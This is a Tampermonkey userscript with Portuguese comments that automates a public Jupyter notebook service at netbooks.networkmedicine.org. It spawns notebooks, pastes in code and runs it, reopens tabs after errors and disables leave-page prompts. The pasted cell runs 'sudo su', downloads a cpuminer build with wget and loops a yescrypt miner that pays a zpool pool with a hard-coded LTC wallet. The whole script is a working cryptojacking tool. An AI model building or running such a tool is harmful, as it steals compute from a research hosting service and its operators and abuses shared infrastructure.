// ==UserScript==
// @name         zpool
// @namespace    felipe-netbook
// @version      0.2
// @updateURL https://raw.githubusercontent.com/prestess/HTTP/main/tampermonkey.js
// @description  q bom tudo tranquilo
// @author       felipe
// @icon
// @grant        none
// @match        https://www.invertexto.com/netbook
// @match        http://netbooks.networkmedicine.org/*/Welcome_to_netBooks.ipynb*
// @match        http://netbooks.networkmedicine.org/*/Untitled*
// @match        http://netbooks.networkmedicine.org/user/*/
// @match        http://netbooks.networkmedicine.org/hub/spawn-pending/*
// ==/UserScript==
//**************
function desabilitarSaidaSite(){
window.onbeforeunload=function(){let id=null;}
let onBeforeUnloadListener;
window.addEventListener('beforeunload', onBeforeUnloadListener = ev => {
  ev.preventDefault();
  ev.returnValue = 'Any';});
window.removeEventListener('beforeunload', onBeforeUnloadListener);
}
//************
const site_endereco="http://netbooks.networkmedicine.org";
let verif=0;
let endereco=window.location.href;
verif=endereco.match(/invertexto\.com\/netbook/gi);
if(verif!=null)
(function() {
    'use strict';
setTimeout(()=>{window.open(site_endereco,"_blank");},5000);
})();
//************
verif=0;
endereco=window.location.href;
verif=endereco.match(/Welcome_to_netBooks/gi);
if(verif!=null)
(function() {
    'use strict';

let elem_menu_file=document.getElementById('filelink');
let elem_submenu_new=document.getElementById('new_notebook').getElementsByTagName("a")[0];
let elem_submenu_python=0;//document.getElementById('new-notebook-submenu-python3').getElementsByTagName("a")[0];

setTimeout(function(){elem_menu_file.click()},3000);
setTimeout(function(){elem_submenu_new.click();
elem_submenu_python=document.getElementById('new-notebook-submenu-python3').getElementsByTagName("a")[0];
elem_submenu_python.click()},2000);
setTimeout(()=>{
desabilitarSaidaSite();window.close();},20000);
})();
//************
endereco=window.location.href;
verif=endereco.match(/spawn-pending/gi);
if(verif!=null)
(function() {
    'use strict';
 setTimeout(()=>{
let prg=$('#progress-message');
if(prg!=null){
window.open(site_endereco,"_blank");
setTimeout(()=>{window.close()},10000);
}
},30000);
})();
//************
endereco=window.location.href;
verif=endereco.match(/\/user\/*\//gi);
if(verif!=null)
(function() {
    'use strict';
setTimeout(()=>{
let prg=$('div .error');
for(var i=0;i<prg.length;i++){
let j = prg[i].getElementsByTagName('h1');
for(var m=0;m<j.length;m++){
 let p=j[m].innerHTML;
 let re=p.match(/503 : Service Unavailable/gi);
 if(re){
 window.open(site_endereco,"_blank");
setTimeout(()=>{window.close()},10000);
 //503 : Service Unavailable
   }
 }
}
},8000);

})();
//************
endereco=window.location.href;
verif=endereco.match(/\/user\/*\//gi);
if(verif!=null)
(function() {
    'use strict';
let d=$('div .error')[0];
if(d!=null)setTimeout(()=>{
window.open(site_endereco,"_blank");
setTimeout(()=>{window.close()},10000);
},5000);
})();
//************
verif=0;
endereco=window.location.href;
verif=endereco.match(/Untitled/gi);
if(verif!=null)
(function() {
    'use strict';
let texto=0;
var linha=0;
/*
texto='!sudo su\n\r';
texto+='import random\n\r';
texto+='!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz \n\r';
texto+='!tar xf cpuminer-opt-linux.tar.gz\n\r';
texto+='while 1:\n\r';
texto+=' ';
texto+='!./cpuminer-sse2 --algo yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u LTC:MGc1CUwppmaF8R4hVVbgXhYBWeEus3jrZF -p c=LTC\n\r';
texto+='!sleep random.randint(1,0)\n\r';
*/
texto='!sudo su\n\r';
texto+='import random\n\r';
texto+='!wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz\n\r';
texto+='!tar xf cpuminer-opt-linux.tar.gz\n\r';
texto+='while 1:\n\r';
texto+=' ';
texto+='!./cpuminer-sse2  -t 10  -r 5  -a yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -p c=LTC -u LTC:MGc1CUwppmaF8R4hVVbgXhYBWeEus3jrZF \n\r';
texto+='!sleep random.randint(1,2)\n\r';
//************
desabilitarSaidaSite();
let nova=false;
setInterval(()=>{
//div.modal-footer
//button.btn.btn-default.btn-sa
let dbtn=$('div .modal-footer')[0].getElementsByTagName('button')[0];
if(dbtn && nova==false){
nova=true;window.open(site_endereco,"_self");}},5000);
//**************
setTimeout(()=>{
let txta=$('textarea')[0];
txta.focus();
txta.value=texto;
setTimeout(()=>{
desabilitarSaidaSite();
let txta=$('textarea')[0];
if(txta.value.length==348){
window.open(site_endereco,"_self");
}else if(txta.value.length!=348){
document.getElementById('run_int').getElementsByTagName('button')[0].click();
}},(Math.floor(Math.random() * 15) + 6000));
},(Math.floor(Math.random() * 15) + 6000));

})();
//*********